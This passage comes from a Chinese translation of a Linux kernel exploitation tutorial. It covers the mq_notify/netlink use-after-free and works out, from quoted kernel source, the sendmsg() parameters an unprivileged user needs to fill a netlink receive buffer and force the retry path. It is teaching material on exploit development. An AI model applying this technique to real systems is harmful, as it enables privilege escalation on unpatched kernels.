&#125;=-</span><br><span class="line">- sk = 0xffff88003b8f9800</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 0</span><br><span class="line">- nlk-&gt;state = 0</span><br><span class="line">- sk-&gt;sk_flags = 100</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(2853-2853) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>

<p><em>Long story short: because of dup(), calling close() will not release a reference on netlink_sock object. It is the netlink_detachskb() that actually releases the last reference on netlink_sock (and frees it). In the end, the use-after-free is triggered during program exit, while releasing the “unblock_fd” file descriptor (in netlink_release()).</em></p>
<blockquote>
<p>原文中触发了Kernel Panic，但是实际测试的时候并没有导致Kernel Panic，为了验证所使用的系统的正确性，使用了本文后续的poc进行验证，是能够导致Kernel Panic的，不知道本章节的exploit的问题在哪。</p>
</blockquote>
<h3 id="Looping-back-to-“retry”-label"><a href="#Looping-back-to-“retry”-label" class="headerlink" title="Looping back to “retry” label"></a>Looping back to “retry” label</h3><p>来看下我们的待办事项：</p>
<ol>
<li>强制netlink_attachskb()返回1</li>
<li>[已完成]强制第二次fget()返回NULL</li>
<li>[已完成]唤醒主线程</li>
</ol>
<p>为了到达<strong>retry</strong>标签，就需要**netlink_attachskb()**返回1。唯一的办法就是需要满足下列条件并唤醒线程（这个条件已经满足）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">netlink_attachskb</span><span class="params">(struct sock *sk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">              <span class="keyword">long</span> *timeo, struct sock *ssk)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line">      nlk = nlk_sk(sk);</span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// ... cut ...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// normal path</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>[0]的条件为True的要求：</p>
<ol>
<li><strong>sk_rmem_alloc</strong>的值比<strong>sk_rcvbuf</strong>大，或者</li>
<li><strong>nlk-&gt;state</strong>的最低比特位被设置</li>
</ol>
<p>我们现在所使用的办法是用STAP脚本强制修改<strong>nlk-&gt;state</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = (<span class="title">void</span>*) <span class="title">STAP_ARG_arg_sock</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = (<span class="title">void</span>*) <span class="title">sk</span>;</span></span><br><span class="line">nlk-&gt;state |= <span class="number">1</span>;      </span><br></pre></td></tr></table></figure>

<p>但是实际中如果要这么设置，就只能让内核内存分配失败。这将会导致系统处于一个不稳定的状态从而影响我们的exploit。所以我们只能尝试增加<strong>sk_rmem_alloc</strong>的值，这个值用于表示“当前”sock的接收buf的大小。</p>
<h4 id="Filling-The-Receive-Buffer"><a href="#Filling-The-Receive-Buffer" class="headerlink" title="Filling The Receive Buffer"></a>Filling The Receive Buffer</h4><p>在这一小节中，我们尝试满足第一个条件。满足这个条件意味着接收buf是否已满：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf</span><br></pre></td></tr></table></figure>

<p>sock结构体（包含在netlink_sock结构体中）有以下属性：</p>
<ul>
<li><strong>sk_rcvbuf</strong>：理论上接收buf大小的最大值（字节数）</li>
<li><strong>sk_rmem_alloc</strong>：当前接收buf的大小（字节数）</li>
<li><strong>sk_receive_queue</strong>：”skb”双向链表 (i.e. network buffers)</li>
</ul>
<p><strong>NOTE</strong>：“理论上”的意思是，<strong>sk_rmem_alloc</strong>实际上是可以超过<strong>sk_rcvbuf</strong>的。</p>
<p>在Part 1中我们使用STAP输出了netlink sock结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- sk-&gt;sk_rmem_alloc = <span class="number">0</span></span><br><span class="line">- sk-&gt;sk_rcvbuf = <span class="number">133120</span></span><br></pre></td></tr></table></figure>

<p>我们有两种办法来满足这个条件：</p>
<ol>
<li>将sk_rcvbuf减到0一下（类型是int）</li>
<li>增加sk_rmem_alloc到133120以上</li>
</ol>
<h4 id="Lowering-sk-rcvbuf"><a href="#Lowering-sk-rcvbuf" class="headerlink" title="Lowering sk_rcvbuf"></a>Lowering sk_rcvbuf</h4><p><em>sk_rcvbuf</em>在sock对象中十分常见，但netlink socket并没有很多地方对其值进行了修改。有一处就是<strong>sock_setsockopt</strong>（使用SOL_SOCKET可达）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// from [net/core/sock.c]</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sock_setsockopt</span><span class="params">(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">char</span> __user *optval, <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line">      <span class="keyword">int</span> val;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ... cut  ...</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> SO_RCVBUF:</span><br><span class="line">[<span class="number">0</span>]     <span class="keyword">if</span> (val &gt; sysctl_rmem_max)</span><br><span class="line">          val = sysctl_rmem_max;</span><br><span class="line">    set_rcvbuf:</span><br><span class="line">        sk-&gt;sk_userlocks |= SOCK_RCVBUF_LOCK;</span><br><span class="line">[<span class="number">1</span>]     <span class="keyword">if</span> ((val * <span class="number">2</span>) &lt; SOCK_MIN_RCVBUF)</span><br><span class="line">          sk-&gt;sk_rcvbuf = SOCK_MIN_RCVBUF;          </span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">          sk-&gt;sk_rcvbuf = val * <span class="number">2</span>;                 </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ... cut (other options handling) ...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当见到诸如此类的代码时，<strong>注意每一个参数的类型</strong>。</p>
<p><strong>注意</strong>：A lot of bugs exist because of this “signed/unsigned type mixing”. The same goes when casting a bigger type (u64) to a smaller type (u32). This often leads to <em>int overflow</em> or <em>type casting</em> issues.</p>
<p>在上述代码中（可能因内核版本不一而不一样）：</p>
<ul>
<li><strong>sk_rcvbuf</strong>: int</li>
<li><strong>val</strong>: int</li>
<li><strong>sysctl_rmem_max</strong>: __u32</li>
<li><strong>SOCK_MIN_RCVBUF</strong>: “promoted” to size_t because of “sizeof()”</li>
</ul>
<p>SOCK_MIN_RCVBUF定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCK_MIN_RCVBUF (2048 + sizeof(struct sk_buff))</span></span><br></pre></td></tr></table></figure>

<p>总而言之，当混合signed int和unsigned int时，signed int会被转换为unsigned int。</p>
<p><strong>WARNING</strong>：不同的编译器可能有不同的策略，以汇编为准。</p>
<p>让我们来考虑将一个负值传递给<strong>val</strong>，代码运行至[0]，它会被转化成无符号数（因为<strong>sysctl_rmem_max</strong>是__u32），所以<strong>val</strong>在这会被重置为<em>sysctl_rmem_max</em>。如果<strong>val</strong>不被转为__u32的话，将不会通过[1]处的检查。在最后，<strong>sk_rcvbuf</strong>的取值范围为[SOCK_MIN_RCVBUF, sysctl_rmem_max]。</p>
<p>所以我们只能操作<strong>sk_rmem_alloc</strong>来达到我们的目的。</p>
<p><strong>注意</strong>：While developing an exploit you will meet this phenomenon: analyzing a lot of code paths that actually lead to <em>nowhere</em>. We wanted to expose it in this article.</p>
<h4 id="Back-to-the-“normal”-path"><a href="#Back-to-the-“normal”-path" class="headerlink" title="Back to the “normal” path"></a>Back to the “normal” path</h4><p>现在是时候回到我们自本系列一直忽略的东西：mq_notify()的normal path。从概念上讲，当sock接收buffer已满时，存在“retry path”，因为normal path可能实际填充它。</p>
<p>在netlink_attachskb()：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">netlink_attachskb</span><span class="params">(struct sock *sk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">long</span> *timeo, struct sock *ssk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line">  nlk = nlk_sk(sk);</span><br><span class="line">  <span class="keyword">if</span> (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &#123;</span><br><span class="line">      <span class="comment">// ... cut (retry path) ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  skb_set_owner_r(skb, sk);       <span class="comment">// &lt;----- what about this ?</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以，<em>normal path</em>调用**skb_set_owner_r()**：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">skb_set_owner_r</span><span class="params">(struct sk_buff *skb, struct sock *sk)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      WARN_ON(skb-&gt;destructor);</span><br><span class="line">      __skb_orphan(skb);</span><br><span class="line">      skb-&gt;sk = sk;</span><br><span class="line">      skb-&gt;destructor = sock_rfree;</span><br><span class="line">[<span class="number">0</span>]   atomic_add(skb-&gt;truesize, &amp;sk-&gt;sk_rmem_alloc);  <span class="comment">// sk-&gt;sk_rmem_alloc += skb-&gt;truesize</span></span><br><span class="line">      sk_mem_charge(sk, skb-&gt;truesize);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>是的，<strong>skb_set_owner_r()使用skb-&gt;truesize增加sk_rmem_alloc</strong>。所以，我们是否可以多次调用mq_notify()直到接收buffer装满？不幸的是我们没办法简单的达成这件事。</p>
<p>在mq_notify()的normal path中，在函数的开头创建了一个skb(被称为cookie)，并使用netlink_attachskb()附加到netlink_sock，我们之前已经介绍过了。netlink_sock和skb都与属于消息队列的mqueue_inode_info结构相关。</p>
<p>问题是，一次只能有一个cookie “skb”与mqueue_inode_info结构相关联。也就是说，第二次调用mq_notify()将失败并显示“-EBUSY”错误。换句话说，我们只能增加sk_rmem_alloc大小一次（对于给定的消息队列），这是不够（只有32个字节）使它大于sk_rcvbuf。</p>
<p>我们实际上<em>可能</em>创建多个消息队列，因此拥有多个mqueue_inode_info对象并多次调用mq_notify()。或者，我们也可以使用mq_timedsend()系统调用将消息推送到队列中。 因为我们不想研究另一个子系统（mqueue），并且坚持使用“通用”内核路径（sendmsg），所以我们不会这样做。虽然这可能是一个很好的锻炼。</p>
<p><strong>NOTE</strong>: There are always multiple ways to code an exploit.</p>
<p>虽然我们不会采用mq_notify()的normal path，但它仍然暴露了一件重要的事情：我们可以使用skb_set_owner_r()，也就是netlink_attachskb()增加sk_rmem_alloc。</p>
<h4 id="The-netlink-unicast-path"><a href="#The-netlink-unicast-path" class="headerlink" title="The netlink_unicast() path"></a>The netlink_unicast() path</h4><p>在skb_set_owner_r()的帮助下，netlink_attachskb()可能会增加sk_rmem_alloc的值。netlink_attachskb()同样由**netlink_unicast()**调用。让我们自下而上来分析下如何通过系统调用到达netlink_unicast()：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- skb_set_owner_r</span><br><span class="line">- netlink_attachskb</span><br><span class="line">- netlink_unicast   </span><br><span class="line">- netlink_sendmsg   <span class="comment">// there is a lots of &quot;other&quot; callers of netlink_unicast</span></span><br><span class="line">- sock-&gt;ops-&gt;sendmsg()          </span><br><span class="line">- __sock_sendmsg_nosec()</span><br><span class="line">- __sock_sendmsg()</span><br><span class="line">- sock_sendmsg()</span><br><span class="line">- __sys_sendmsg()</span><br><span class="line">- SYSCALL_DEFINE3(sendmsg, ...)</span><br></pre></td></tr></table></figure>

<p>因为**netlink_sendmsg()**是netlink sockets的一个操作原型，所以我们可以通过sendmsg()系统调用到达它。</p>
<p>从sendmsg()系统调用到sendmsg的proto_ops（sock-&gt;ops-&gt;sendmsg()）的通用代码路径将在第3部分的更深入地介绍。现在，让我们假设我们可以毫不费力地访问netlink_sendmsg()。</p>
<h4 id="Reaching-netlink-unicast-from-netlink-sendmsg"><a href="#Reaching-netlink-unicast-from-netlink-sendmsg" class="headerlink" title="Reaching netlink_unicast() from netlink_sendmsg()"></a>Reaching netlink_unicast() from netlink_sendmsg()</h4><p>sendmsg()系统调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendmsg</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>

<p>到达netlink_unicast()需要把<em>msg</em>和<em>flags</em>设置为合适的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> &#123;</span></span><br><span class="line">   <span class="keyword">void</span>         *msg_name;       <span class="comment">/* optional address */</span></span><br><span class="line">   <span class="keyword">socklen_t</span>     msg_namelen;    <span class="comment">/* size of address */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">msg_iov</span>;</span>        <span class="comment">/* scatter/gather array */</span></span><br><span class="line">   <span class="keyword">size_t</span>        msg_iovlen;     <span class="comment">/* # elements in msg_iov */</span></span><br><span class="line">   <span class="keyword">void</span>         *msg_control;    <span class="comment">/* ancillary data, see below */</span></span><br><span class="line">   <span class="keyword">size_t</span>        msg_controllen; <span class="comment">/* ancillary data buffer len */</span></span><br><span class="line">   <span class="keyword">int</span>           msg_flags;      <span class="comment">/* flags on received message */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> __user     *iov_base;</span><br><span class="line">  <span class="keyword">__kernel_size_t</span> iov_len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在本节中，我们将从代码中推断出合适的参数值，并逐步建立我们的“约束”列表。这样做会使内核执行我们想要的路径。内核利用实际上就是这个意思。 这里，对netlink_unicast()的调用位于最后，所以我们需要通过（或跳过）所有检查……</p>
<p>开始吧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">netlink_sendmsg</span><span class="params">(struct kiocb *kiocb, struct socket *sock,</span></span></span><br><span class="line"><span class="function"><span class="params">             struct msghdr *msg, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock_iocb</span> *<span class="title">siocb</span> = <span class="title">kiocb_to_siocb</span>(<span class="title">kiocb</span>);</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = <span class="title">nlk_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> *<span class="title">addr</span> = <span class="title">msg</span>-&gt;<span class="title">msg_name</span>;</span></span><br><span class="line">      u32 dst_pid;</span><br><span class="line">      u32 dst_group;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">      <span class="keyword">int</span> err;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">scm_cookie</span> <span class="title">scm</span>;</span></span><br><span class="line">      u32 netlink_skb_flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (msg-&gt;msg_flags&amp;MSG_OOB)</span><br><span class="line">        <span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]   <span class="keyword">if</span> (<span class="literal">NULL</span> == siocb-&gt;scm)</span><br><span class="line">        siocb-&gt;scm = &amp;scm;</span><br><span class="line"></span><br><span class="line">      err = scm_send(sock, msg, siocb-&gt;scm, <span class="literal">true</span>);</span><br><span class="line">[<span class="number">2</span>]   <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ... cut ...</span></span><br><span class="line"></span><br><span class="line">      err = netlink_unicast(sk, skb, dst_pid, msg-&gt;msg_flags&amp;MSG_DONTWAIT);   <span class="comment">// &lt;---- our target</span></span><br><span class="line"></span><br><span class="line">    out:</span><br><span class="line">      scm_destroy(siocb-&gt;scm);</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>标志位<em>MSG_OOB</em>不能被设置以通过[0]处的检查，因此第一个限制条件：<strong>msg-&gt;msg_flags MSG_OOB位为0</strong>。</p>
<p>为了通过[1]处的检查，需要在*<em>__sock_sendmsg_nosec()**中设置siocb-&gt;scm为</em>NULL<em>。最后，</em>scm_send()*不能返回负值。代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __inline__ <span class="keyword">int</span> <span class="title">scm_send</span><span class="params">(struct socket *sock, struct msghdr *msg,</span></span></span><br><span class="line"><span class="function"><span class="params">                   struct scm_cookie *scm, <span class="keyword">bool</span> forcecreds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(scm, <span class="number">0</span>, <span class="keyword">sizeof</span>(*scm));</span><br><span class="line">    <span class="keyword">if</span> (forcecreds)</span><br><span class="line">        scm_set_cred(scm, task_tgid(current), current_cred());</span><br><span class="line">    unix_get_peersec_dgram(sock, scm);</span><br><span class="line">    <span class="keyword">if</span> (msg-&gt;msg_controllen &lt;= <span class="number">0</span>)     <span class="comment">// &lt;----- this need to be true...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;                     <span class="comment">// &lt;----- ...so we hit this and skip __scm_send()</span></span><br><span class="line">    <span class="keyword">return</span> __scm_send(sock, msg, scm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，第二个限制条件：<strong>msg-&gt;msg_controllen (size_t) 为0</strong>。继续：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// ... netlink_sendmsg() continuation ...</span></span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (msg-&gt;msg_namelen) &#123;</span><br><span class="line">        err = -EINVAL;</span><br><span class="line">[<span class="number">1</span>]     <span class="keyword">if</span> (addr-&gt;nl_family != AF_NETLINK)</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">[<span class="number">2</span>a]    dst_pid = addr-&gt;nl_pid;</span><br><span class="line">[<span class="number">2b</span>]    dst_group = ffs(addr-&gt;nl_groups);</span><br><span class="line">        err =  -EPERM;</span><br><span class="line">[<span class="number">3</span>]     <span class="keyword">if</span> ((dst_group || dst_pid) &amp;&amp; !netlink_allowed(sock, NL_NONROOT_SEND))</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        netlink_skb_flags |= NETLINK_SKB_DST;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dst_pid = nlk-&gt;dst_pid;</span><br><span class="line">        dst_group = nlk-&gt;dst_group;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ... cut ...</span></span><br></pre></td></tr></table></figure>

<p>好的，这个有点棘手。 此块取决于sender socket是否已连接到目标（receiver）socket。 如果是，则nlk-&gt; dst_pid和nlk-&gt; dst_group都已设置。由于我们不想连接到receiver socket（可能会有副作用），想采取第一个分支，那就要求**msg-&gt;msg_namelen必须不等于零[0]**。</p>
<p>如果我们回过头看函数一开始的地方，我们可以发现addr是另一个我们可以控制的参数：msg-&gt;msg_name。在[2a]和[2b]的帮助下，我们可以任意写入dst_group和dst_pid。控制这些允许我们：</p>
<ol>
<li>dst_group == 0：send a unicast message instead of broadcast (cf. <em>man 7 netlink</em>)</li>
<li>dst_pid != 0：talk to the receiver socket (userland) of our choice. Zero meaning “talk to the kernel” (read the manual!).</li>
</ol>
<p>Which we translate in the constraint list into (msg_name被转为sockaddr_nl):</p>
<ol>
<li><strong>msg-&gt;msg_name-&gt;dst_group为0</strong></li>
<li><strong>msg-&gt;msg_name-&gt;dst_pid等于”destination” socket nl_pid</strong></li>
</ol>
<p>但是，这意味着<strong>netlink_allowed(sock, NL_NONROOT_SEND)</strong> [3]不会返回0：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">netlink_allowed</span><span class="params">(<span class="keyword">const</span> struct socket *sock, <span class="keyword">unsigned</span> <span class="keyword">int</span> flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (nl_table[sock-&gt;sk-&gt;sk_protocol].flags &amp; flag) || capable(CAP_NET_ADMIN));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为我们不是特权用户，所以没有CAP_NET_ADMIN标记位。唯一拥有NL_NONROOT_SEND标记位的netlink协议是<em>NETLINK_USERSOCK</em>。也就是说，<strong>sender socket必须使用NETLINK_USERSOCK协议</strong>。</p>
<p>另外在[1]中，我们需要 <strong>msg-&gt;msg_name-&gt;nl_family等于AF_NETLINK</strong>。</p>
<p>下一步：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (!nlk-&gt;pid) &#123;</span><br><span class="line">[<span class="number">1</span>]     err = netlink_autobind(sock);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>我们无法控制[0]处的检查，因为在socket创建期间，套接字的pid被设置为零（整个结构由sk_alloc()清零）。但<strong>netlink_autobind()</strong> [1]将为我们的sender socket找到“可用”pid并且它不会失败。在第二次调用sendmsg()时将跳过检查，此时将设置nlk-&gt;pid。下一个：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      err = -EMSGSIZE;</span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (len &gt; sk-&gt;sk_sndbuf - <span class="number">32</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      err = -ENOBUFS;</span><br><span class="line">      skb = alloc_skb(len, GFP_KERNEL);</span><br><span class="line">[<span class="number">1</span>]   <span class="keyword">if</span> (skb == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br></pre></td></tr></table></figure>

<p>在这，len在**__sys_sendmsg()**中被计算，这是所有iovec的长度和。所以，所有iovecs的总和必须小于sk-&gt; sk_sndbuf减去32 [0]。为了简单起见，我们将使用单个iovec，就是：</p>
<ul>
<li><strong>msg-&gt;msg_iovlen等于1</strong> // a single iovec</li>
<li><strong>msg-&gt;msg_iov-&gt;iov_len小于等于sk-&gt;sk_sndbuf减去32</strong></li>
<li><strong>msg-&gt;msg_iov-&gt;iov_base需要用户态可读地址</strong> // 否则__sys_sendmsg()会失败</li>
</ul>
<p>最后一个限制是<strong>msg-&gt;msg_iov同样需要用户态可读地址</strong>（否则__sys_sendmsg()会失败）</p>
<p><strong>NOTE</strong>：sk_sndbuf相当于sk_rcvbuf，但对于发送缓冲区，我们可以使用**sock_getsockopt()**选项SO_SNDBUF检索其值。</p>
<p>[1]处的检查几乎不会不通过，如果不通过意味着内核已经用尽了内存。</p>
<p>下一块代码可以忽略（没有通过任何检查的需求），siocb-&gt;scm结构体在scm_send()中初始化：</p>
